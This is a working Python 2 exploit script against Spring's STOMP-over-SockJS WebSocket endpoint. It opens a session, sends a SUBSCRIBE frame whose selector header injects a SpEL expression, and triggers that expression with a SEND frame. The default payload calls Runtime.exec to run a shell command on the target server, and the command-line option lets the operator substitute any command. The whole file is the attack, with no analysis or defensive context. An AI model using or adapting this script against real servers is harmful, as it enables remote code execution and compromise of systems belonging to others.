import requests
import random
import sys
import time
import optparse

websocket_url = None
see_url = None

headers = {
        "Cache-Control" : "no-cache",
        "Accept" : "*/*",
        "Accept-Encoding" : "gzip, deflate",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; NMTE; rv:11.0) like Gecko",
        "Accept-Language": "zh-CN",
        "Connection": "close"
    }

def connect():
    print "connetc", websocket_url + "/info"
    conn = requests.get(websocket_url + "/info", headers=headers, timeout=4, verify=False)
    if '"websocket"' not in conn.content:
        print "not foun spring xxxx"
        sys.exit(-1)

    time.sleep(0.5)
    see = requests.Session()
    try:
        conn = see.get(see_url + "/htmlfile?c=_jp.10laupv", stream=True, timeout=2, verify=False)

        see.close()
    except:
        return
    

def send_payload(sub_url ,payload):
    conn1 = requests.post(see_url + "/xhr_send", headers=headers, verify=False,
        data='["CONNECT\\naccept-version:1.1,1.0\\nheart-beat:10000,10000\\n\\n\\u0000"]')
    
    if conn1.status_code != 204:
        print "CONNECT error"
        print conn1.content
        sys.exit(-1)


    time.sleep(0.2)
    data = """["SUBSCRIBE\\nselector:{0}\\nid:sub-0\\ndestination:{1}\\n\\n\\u0000"]"""
    payload = data.format(payload, sub_url)
    conn2 = requests.post(see_url + "/xhr_send", verify=False,
        headers=headers, data=payload)
    
    if conn2.status_code != 204:
        print "SUBSCRIBE error"
        print conn2.content
        sys.exit(-1)
    

def trigger(send_url):
    data = '["SEND\\ndestination:{send_url}\\ncontent-length:15\\n\\n{\\"test\\":\\"test\\"}\\u0000"]'

    data = data.replace('{send_url}', send_url)
    conn = requests.post(see_url + "/xhr_send", data=data, verify=False)
    if conn.status_code != 204:
        print "SEND error"
        print conn.content
        sys.exit(-1)

def main(sub_url, send_url, payload):
    connect()
    send_payload(sub_url, payload)
    trigger(send_url)
    print "done"

if __name__ == '__main__':
    parser = optparse.OptionParser('usage: %prog http://192.168.1.24:8080/gs-guide-websocket', version="%prog 0.0.1")
    parser.add_option('--sub-url', dest='sub_url', default = "/topic/greetings", 
                      help='SUBSCRIBE URL')

    parser.add_option('--send-url', dest='send_url', default = "/app/hello", 
                      help='SEND URL')

    #
    parser.add_option('--payload', dest='payload', default = "T(java.lang.Runtime).getRuntime().exec('touch /tmp/vul.txt')", 
                      help='SPEL payload')

    (options, args) = parser.parse_args()

    if len(args) < 1:
        parser.print_help()
        sys.exit(0)

    target = args[0].strip("/")
    if "://" not in target:
        target = "http://" + target

    print "target", target

    websocket_url = target
    see_url = websocket_url + "/" + str(random.randint(100,999)) + "/smxd1"+str(random.randint(100,999))


    main(options.sub_url, options.send_url, options.payload)